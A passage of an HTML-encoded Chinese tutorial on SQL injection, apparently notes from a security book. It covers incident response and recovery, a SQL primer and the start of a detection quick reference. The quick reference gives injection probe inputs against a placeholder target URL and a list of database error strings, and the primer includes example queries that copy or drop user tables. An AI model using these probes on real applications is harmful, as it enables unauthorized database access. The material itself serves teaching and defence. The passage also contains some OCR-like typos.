&lt;h3 id=&#34;如果你是受害者，该怎么办？&#34;&gt;&lt;a href=&#34;#如果你是受害者，该怎么办？&#34; class=&#34;headerlink&#34; title=&#34;如果你是受害者，该怎么办？&#34;&gt;&lt;/a&gt;如果你是受害者，该怎么办？&lt;/h3&gt;&lt;h4 id=&#34;遏制安全事件&#34;&gt;&lt;a href=&#34;#遏制安全事件&#34; class=&#34;headerlink&#34; title=&#34;遏制安全事件&#34;&gt;&lt;/a&gt;遏制安全事件&lt;/h4&gt;&lt;p&gt;要遏制SQL注入攻击事件，可以简单地拔除受损害服务器的网线。&lt;/p&gt;
&lt;h4 id=&#34;评估涉及的数据&#34;&gt;&lt;a href=&#34;#评估涉及的数据&#34; class=&#34;headerlink&#34; title=&#34;评估涉及的数据&#34;&gt;&lt;/a&gt;评估涉及的数据&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;涉及信息的类型。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;涉及的信息是否可辨识为个人信息还是组织机构的信息。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;影响到哪些国家、州或省的人。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;对数据执行了什么操作（更新、删除、修改或泄漏）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;重用未授权数据的影响。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;任何缓解措施，比如数据加密，这可以降低未经授权的人重用这些信息的可能性。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;通知相关人员&#34;&gt;&lt;a href=&#34;#通知相关人员&#34; class=&#34;headerlink&#34; title=&#34;通知相关人员&#34;&gt;&lt;/a&gt;通知相关人员&lt;/h4&gt;&lt;p&gt;要求委托管理个人信息的组织机构在数据安全遭受破坏时通知受影响的人员。&lt;/p&gt;
&lt;h4 id=&#34;确定攻击者在系统上执行了哪些操作？&#34;&gt;&lt;a href=&#34;#确定攻击者在系统上执行了哪些操作？&#34; class=&#34;headerlink&#34; title=&#34;确定攻击者在系统上执行了哪些操作？&#34;&gt;&lt;/a&gt;确定攻击者在系统上执行了哪些操作？&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;标识出攻击者查看到的信息。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;识别出攻击者执行的DML和DDL操作，以及受影响的特定记录。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;标识出事务之前和事务之后受影响的数据状态，以支持恢复数据库。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;恢复之前己经被删除的数据。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;数据库取证资源&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;RDBMS&lt;/th&gt;
&lt;th&gt;图   书&lt;/th&gt;
&lt;th&gt;专注于信息取证的Web网站&lt;/th&gt;
&lt;th&gt;工   具&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Microsoft  SQL  Server&lt;/td&gt;
&lt;td&gt;SQL Server Forensic Analysis，Addison  Wesley Professional&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://www.applicationfdrensics.com/&#34;&gt;www.applicationfdrensics.com&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Windows Forensic Toolchest  (SQL)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Oracle&lt;/td&gt;
&lt;td&gt;Oracle Forensics，  Rampant  Press&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://www.red-databasesecurity.com/&#34;&gt;www.red-databasesecurity.com&lt;/a&gt;  &lt;br&gt;&lt;a href=&#34;http://www.v3rity.com/&#34;&gt;www.v3rity.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://www.applicationfbrensics.com/&#34;&gt;www.applicationfbrensics.com&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;McAfee Security Scanner for  Databases&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;MySQL&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://www.applicationfbrensics.com/&#34;&gt;www.applicationfbrensics.com&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://www.applicationfbrensics.com/&#34;&gt;www.applicationfbrensics.com&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id=&#34;从SQL注入攻击中恢复&#34;&gt;&lt;a href=&#34;#从SQL注入攻击中恢复&#34; class=&#34;headerlink&#34; title=&#34;从SQL注入攻击中恢复&#34;&gt;&lt;/a&gt;从SQL注入攻击中恢复&lt;/h4&gt;&lt;p&gt;静态有效载荷：从一个受损害系统到另外一个受损害系统，在后损害(post-compromise)系统上执行的活动是一致的。&lt;/p&gt;
&lt;p&gt;动态有效载荷：从一个受损害系统到另外一个受损害系统，在后损害(post-compromise)系统上执行的活动是不一致的。&lt;/p&gt;
&lt;h5 id=&#34;确定攻击携带的有效载荷&#34;&gt;&lt;a href=&#34;#确定攻击携带的有效载荷&#34; class=&#34;headerlink&#34; title=&#34;确定攻击携带的有效载荷&#34;&gt;&lt;/a&gt;确定攻击携带的有效载荷&lt;/h5&gt;&lt;p&gt;执行下面的步骤，以识别成功SQL注入攻击的有效载荷：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;备份受损害数据库：为受损害数据库制作两份副本。一份用于恢复数据，另一份则作为干净的恢复点，以备在恢复出现问题时使用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;提取恶意的SQL注入查询，从受损害的Web服务器日志、数据库执行计划，包括从MySQL和PostgreSQL数据库服务器的statement log和binary logs中提取恶意查询和语句的唯一清单。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;理解恶意查询的逻辑：检查列出的恶意查询和语句，确定它们所创建、访问、更新或删除的对象，以及攻击者如何实现这些操作。我们需要这些信息来确定安全事件影响的范围， 从而规划出恢复安全事件的步骤。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;搜索恶意查询参考：我们可能己经具有己知恶意语句和命令的列表，可以使用该列表与之前提取的恶意查询清单相互比对，以识别恶意查询的来源。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;确定恶意查询是静态有效载荷还是动态有效载荷的一部分：从搜索结果中可以确定， 攻击是与诸如SQL注入蠕虫这样的静态有效载荷有关，还是与攻击者使用SQL注入漏洞利用工具、投送传统即席查询(ad-hoc)的动态有效载荷有关。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;查找多种漏洞：在恶意查询清单中检查所有的条目，因为同一 SQL注入漏洞可能会被多次利用，既可能使用静态有效载荷也可能通过动态有效载荷。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;从携带静态有效载荷的攻击中恢复&#34;&gt;&lt;a href=&#34;#从携带静态有效载荷的攻击中恢复&#34; class=&#34;headerlink&#34; title=&#34;从携带静态有效载荷的攻击中恢复&#34;&gt;&lt;/a&gt;从携带静态有效载荷的攻击中恢复&lt;/h5&gt;&lt;p&gt;恢复的核心问题，是将数据库回滚到受攻击影响之前的状态，或者识别并取消 (undo)那些恶意查询和语句所执行的具体操作。&lt;/p&gt;
&lt;p&gt;从携带静态有效载荷的攻击中进行恢复的步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;恢复数据库状态&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从备份中恢复&lt;/li&gt;
&lt;li&gt;标识要回滚的事务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;检验数据库服务器配置：如果静态有效载荷带有频繁针对RDBMS特性的攻击，或者解除服务器的安全配置以实现进一步的攻击，那么应该将数据库服务器的配置恢复到已知的良好状态。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;识别并修复SQL注入漏洞：确保对整个代码库进行一次应用程序安全评估，以识别可被利用的漏洞和其他可能存在的情况。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在线恢复系统并恢复Web服务。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;从携带动态有效载荷的攻击中恢复&#34;&gt;&lt;a href=&#34;#从携带动态有效载荷的攻击中恢复&#34; class=&#34;headerlink&#34; title=&#34;从携带动态有效载荷的攻击中恢复&#34;&gt;&lt;/a&gt;从携带动态有效载荷的攻击中恢复&lt;/h5&gt;&lt;p&gt;对于携带动态有效载荷的成功攻击，强烈建议聘请数据库取证专家进行调查取证。&lt;/p&gt;
&lt;p&gt;可以遵循下列步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;恢复数据库状态：对于动态有效载荷的SQL注入攻击，建议将RDBMS和操作系统都恢复到受损害之前的状态。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;识别脱离数据库的活动：在之前收集好的恶意查询清单中，应该标识出那些允许攻击者脱离数据库服务器、进入底层操作系统的文件系统或注册表的语句。如果发现针对操作系统的活动，就应该执行下列操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查找创建了带外通信的任何方法&lt;/li&gt;
&lt;li&gt;查找对操作系统文件的引用，或者攻击者读取、创建或加载到数据库中的注册表键值 (key)。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;检验数据库服务器的配置：一旦攻击者获得对数据库服务器的访问之后，他就会解除存在的安全设置，以便进一步在服务器上实施攻击。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;识别并修复SQL注入漏洞：确保对整个代码库进行一次应用程序安全评估，以识别可被利用的漏洞和其他可能存在的情况。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在线恢复系统并恢复Web服务。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;参考资料&#34;&gt;&lt;a href=&#34;#参考资料&#34; class=&#34;headerlink&#34; title=&#34;参考资料&#34;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;h3 id=&#34;SQL入门&#34;&gt;&lt;a href=&#34;#SQL入门&#34; class=&#34;headerlink&#34; title=&#34;SQL入门&#34;&gt;&lt;/a&gt;SQL入门&lt;/h3&gt;&lt;h4 id=&#34;SQL查询&#34;&gt;&lt;a href=&#34;#SQL查询&#34; class=&#34;headerlink&#34; title=&#34;SQL查询&#34;&gt;&lt;/a&gt;SQL查询&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;SELEC丁语句&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblUsers
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; username &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblUsers
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;admin&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;letmein&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; hackerTable &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblUsers&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;UNION运算符&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblAdmins
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ALL&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblAdmins&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;INSERT 语句&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;john&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;smith&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; tblUsers&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; priv&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;john&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;smith&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;UPDATE 语句&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;UPDATE&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; priv&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;sarah&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;DELETE 语句&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;DELETE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;admin&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;DROP语句&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;DROP&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; tblUsers&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;CREATE TABLE 语句&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; shoppinglist&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;item &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; shoppinglist &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dba_users&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;ALTER TABLE 语句&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;ALTER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;ADD&lt;/span&gt; comments &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;ALTER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;DROP&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;COLUMN&lt;/span&gt; comments
&lt;span class=&#34;token keyword&#34;&gt;ALTER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;ALTER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;COLUMN&lt;/span&gt; comments &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;9&#34;&gt;
&lt;li&gt;GROUP BY语句&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; customer&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;SUM&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cost&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; orders &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; customer &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Anthony Anteater&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;GROUP&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; customer&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;10&#34;&gt;
&lt;li&gt;ORDER BY 子句&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; cost&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;product &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; orders &lt;span class=&#34;token keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;DESC&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;11&#34;&gt;
&lt;li&gt;限制结果集&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;SQL注入快速参考&#34;&gt;&lt;a href=&#34;#SQL注入快速参考&#34; class=&#34;headerlink&#34; title=&#34;SQL注入快速参考&#34;&gt;&lt;/a&gt;SQL注入快速参考&lt;/h3&gt;&lt;h4 id=&#34;识别SQL注入漏洞&#34;&gt;&lt;a href=&#34;#识别SQL注入漏洞&#34; class=&#34;headerlink&#34; title=&#34;识别SQL注入漏洞&#34;&gt;&lt;/a&gt;识别SQL注入漏洞&lt;/h4&gt;&lt;p&gt;发现SQL注入缺陷&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;方   法&lt;/th&gt;
&lt;th&gt;描   述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;异常的输入是否会产生数据库 错误？&lt;/td&gt;
&lt;td&gt;输入SQL元字符或异常、错误的数据类型，有可能产生数据库错误。常见的测试用例包括在字符串字段中输入单引号(‘)字符，或者在数值字段中输入随机的字符串。通常可以通过HTTP状态代码500，或者页面中描述性的错误消息来识别这种数据库错误。提交异常数据并分析服务器响应中的下列字符串，有助于识别SQL注入漏洞：&lt;br&gt;&lt;code&gt;Microsoft OLE DB Provider  ORA-  PLS-  error in your SQL Syntax  80040E14  SQL Error  Incorrect Syntax near  SQLServer  Failed MySQL  Unclosed Quotation Mark  JDBC Driver  ODBC Driver  SQL  ODBC  &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;合法、正确的输入是否可以替换 等效的SQL表达式？&lt;/td&gt;
&lt;td&gt;如果遇到了错误，修改输入的数据以分析错误，确定输入的数据是否导致了SQL语法错误。例如，双倍使用单引号字符——如果一个引号导致了错误，而两个引号没有产生错误，那么很有可能存在未发现的SQL注入缺陷。请注意，由错误数据类型导致的错误可以是预期的并具有正常的表现。 例如，如果在需要数值的地方提供了字符串数据，那么很多应用程序将 产生错误。这时应该进一步采用其他技术来确认是否存在SQL注入漏洞。 在采用这种检测技术之前，判断所测试的输入对于服务器的响应是否有影响是很重要的。例如，如果提供了一个数值，那么尝试使用另一个不同的数值并确定是否产生了可度量且一致的差异。对于字符串值， 使用同一字符集，并将字符串值修改为一个相同长度的随机字符串， 然后观察应用程序的响应。如果对数据的修改并没有对页面长度、内容或HTTP响应代码产生一致的差别，那么该技术不太可能成功。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;合法、正确的输入是否可以替换 等效的SQL表达式？&lt;/td&gt;
&lt;td&gt;数值数据在这个例子中，我们将假定测试一个传递给news.php脚本的数值类型的ID参数。下面两个请求产生了不同的响应，因此可以认为ID参数是动态的，并且可以用于这种测试方法。&lt;br&gt;&lt;a href=&#34;http://target/news.php?ID=1&#34;&gt;http://target/news.php?ID=1&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://target/news.php?ID=2&#34;&gt;http://target/news.php?ID=2&lt;/a&gt; &lt;br&gt;在测试过程中，下一个步骤是提交一个SQL表达式，该表达式将被计算为事先确定好的正确值（比如上面例子中的1和2）。然后将对每一个表达式的响应与初始测试时的响应进行比较，以确定是否对该表达式  进行了计算。在这种类型的测试中，常用的SQL函数是ASCII(),对于所提供的ASCII字符，该函数将返回一个整数。因此，下面的SQL表达式应该返回值1( “2”的ASCT编码值是50)&lt;br&gt;51-ASCII(2) &lt;br&gt;如果我们的输入被SQL Server以不安全的方式解析，那么下列请求应该等价于原始的请求：&lt;br&gt;&lt;a href=&#34;http://target/news.php?ID=51-ASCII(2)&#34;&gt;http://target/news.php?ID=51-ASCII(2)&lt;/a&gt;&lt;br&gt;– 等价手ID=1 &lt;br&gt;&lt;a href=&#34;http://target/news.php?ID=52-ASCII(2)&#34;&gt;http://target/news.php?ID=52-ASCII(2)&lt;/a&gt;&lt;br&gt;– 等价手ID=2 &lt;br&gt;绝大多数主流数据库平台都支持ASCII()函数，包括Microsoft SQL  Server、Oracle、MySQL 和 PostgreSQL。 请使用类似的算术表达式来确认结果。字符串数据 